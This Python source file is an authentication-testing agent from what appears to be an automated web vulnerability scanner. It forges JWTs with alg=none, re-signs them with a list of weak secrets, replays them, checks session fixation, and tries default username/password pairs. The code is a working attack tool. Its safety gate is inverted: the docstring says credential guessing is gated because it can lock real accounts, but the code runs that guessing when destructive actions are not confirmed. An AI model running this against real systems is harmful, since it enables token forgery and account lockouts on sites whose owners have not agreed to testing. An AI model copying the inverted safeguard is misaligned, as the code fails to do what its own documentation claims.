"""Auth agent: JWT alg=none and weak-secret forgery, a pre/post session
fixation check, and default-credential probing. Default credentials are
gated behind CONFIRM_DESTRUCTIVE=false since guessing logins can lock real
accounts -- everything else here is read-only/non-destructive by default.
"""
from __future__ import annotations

import base64
import hashlib
import hmac
import json
import re

from noctis.agents.base_agent import AgentResult
from noctis.agents.http_agent import HttpAgent
from noctis.agents.targeting import baseline_request

JWT_PATTERN = re.compile(r"eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+")
WEAK_SECRETS = ["secret", "changeme", "password", "your-256-bit-secret", "1234567890", "test"]
DEFAULT_CREDENTIALS = [("admin", "admin"), ("admin", "password"), ("test", "test")]
LOGIN_HINTS = ("login", "signin", "sign-in", "auth", "logon")
PASSWORD_INPUT_HINTS = ("password", "passwd", "pwd")


def _b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def _b64url_decode(data: str) -> bytes:
    padding = "=" * (-len(data) % 4)
    return base64.urlsafe_b64decode(data + padding)


class AuthAgent(HttpAgent):
    agent_type = "auth"

    async def run(self) -> AgentResult:
        page_or_target = (
            self.context.node_data.get("page_url")
            or self.context.node_data.get("url")
            or (self.target.url if self.target else None)
        )
        if page_or_target is None:
            return self.no_target_result("no reachable URL for this node")

        jwt_result = await self._check_jwt(page_or_target)
        if jwt_result:
            return jwt_result

        is_login = self._looks_like_login()
        if is_login:
            fixation_result = await self._check_session_fixation(page_or_target)
            if fixation_result:
                return fixation_result

            if not self.context.settings.confirm_destructive:
                creds_result = await self._try_default_credentials()
                if creds_result:
                    return creds_result

        return AgentResult(found=False, notes="no JWT weakness, session fixation, or default creds confirmed")

    async def _check_jwt(self, url: str) -> AgentResult | None:
        try:
            response = await self.client.get(url)
        except Exception:
            return None

        token = None
        for cookie_value in response.cookies.values():
            if JWT_PATTERN.fullmatch(cookie_value):
                token = cookie_value
                break
        if token is None:
            match = JWT_PATTERN.search(response.text)
            token = match.group(0) if match else None
        if token is None:
            return None

        try:
            header_b64, payload_b64, _sig_b64 = token.split(".")
            header = json.loads(_b64url_decode(header_b64))
            payload = json.loads(_b64url_decode(payload_b64))
        except (ValueError, json.JSONDecodeError):
            return None

        none_result = await self._try_none_alg(url, header, payload)
        if none_result:
            return none_result
        return await self._try_weak_secret(url, header, payload)

    async def _try_none_alg(self, url: str, header: dict, payload: dict) -> AgentResult | None:
        forged_header = {**header, "alg": "none"}
        forged = f"{_b64url(json.dumps(forged_header).encode())}.{_b64url(json.dumps(payload).encode())}."
        accepted = await self._replay_token(url, forged)
        if not accepted:
            return None

        async def recheck() -> bool:
            return await self._replay_token(url, forged)

        self._recheck = recheck
        return AgentResult(
            found=True,
            payload=forged,
            request=self._format_request("GET", url, {"Authorization": f"Bearer {forged}"}),
            evidence="server accepted a JWT with alg=none and an empty signature",
        )

    async def _try_weak_secret(self, url: str, header: dict, payload: dict) -> AgentResult | None:
        signing_input = f"{_b64url(json.dumps(header).encode())}.{_b64url(json.dumps(payload).encode())}"
        for secret in WEAK_SECRETS:
            sig = hmac.new(secret.encode(), signing_input.encode(), hashlib.sha256).digest()
            forged = f"{signing_input}.{_b64url(sig)}"
            accepted = await self._replay_token(url, forged)
            if accepted:
                async def recheck(f=forged) -> bool:
                    return await self._replay_token(url, f)

                self._recheck = recheck
                return AgentResult(
                    found=True,
                    payload=forged,
                    request=self._format_request("GET", url, {"Authorization": f"Bearer {forged}"}),
                    evidence=f"JWT re-signed with a weak/common secret ('{secret}') was accepted",
                )
        return None

    async def _replay_token(self, url: str, token: str) -> bool:
        try:
            baseline = await self.client.get(url)
            forged_resp = await self.client.get(url, headers={"Authorization": f"Bearer {token}"}, cookies={"session": token, "token": token})
        except Exception:
            return False
        return forged_resp.status_code != baseline.status_code and forged_resp.status_code < 400

    def _looks_like_login(self) -> bool:
        node_data = self.context.node_data
        path = (node_data.get("url") or node_data.get("action") or "").lower()
        inputs = [str(i).lower() for i in node_data.get("inputs", [])]
        return any(hint in path for hint in LOGIN_HINTS) or any(
            any(hint in i for hint in PASSWORD_INPUT_HINTS) for i in inputs
        )

    async def _check_session_fixation(self, page_url: str) -> AgentResult | None:
        if self.target is None:
            return None
        try:
            pre = await self.client.get(page_url)
        except Exception:
            return None
        pre_session = _session_cookie(pre)
        if pre_session is None:
            return None

        url, body = baseline_request(self.target)
        try:
            post = await self.client.request(
                self.target.method, url, data=body, cookies={"session": pre_session}
            )
        except Exception:
            return None
        post_session = _session_cookie(post)

        if post_session == pre_session and post.status_code < 400:
            async def recheck() -> bool:
                p = await self.client.get(page_url)
                s = _session_cookie(p)
                if s is None:
                    return False
                r = await self.client.request(self.target.method, url, data=body, cookies={"session": s})
                return _session_cookie(r) == s

            self._recheck = recheck
            return AgentResult(
                found=True,
                payload=f"pre-set session={pre_session}",
                request=self._format_request(self.target.method, url, body),
                evidence="session identifier was not rotated after a state-changing (login) request",
            )
        return None

    async def _try_default_credentials(self) -> AgentResult | None:
        if self.target is None:
            return None
        user_field = next((p for p in self.target.param_names if "user" in p.lower() or "email" in p.lower()), None)
        pass_field = next((p for p in self.target.param_names if any(h in p.lower() for h in PASSWORD_INPUT_HINTS)), None)
        if not user_field or not pass_field:
            return None

        for username, password in DEFAULT_CREDENTIALS:
            body = {name: "" for name in self.target.param_names}
            body[user_field] = username
            body[pass_field] = password
            try:
                response = await self.client.request(self.target.method, self.target.url, data=body)
            except Exception:
                continue
            if response.status_code in (301, 302, 303) or (
                response.status_code == 200 and "invalid" not in response.text.lower() and "incorrect" not in response.text.lower()
            ):
                async def recheck(b=body) -> bool:
                    r = await self.client.request(self.target.method, self.target.url, data=b)
                    return r.status_code in (301, 302, 303)

                self._recheck = recheck
                return AgentResult(
                    found=True,
                    payload=f"{username}:{password}",
                    request=self._format_request(self.target.method, self.target.url, body),
                    evidence=f"default credentials '{username}:{password}' were accepted",
                )
        return None


def _session_cookie(response) -> str | None:
    for name, value in response.cookies.items():
        if "session" in name.lower() or "sid" in name.lower():
            return value
    return None
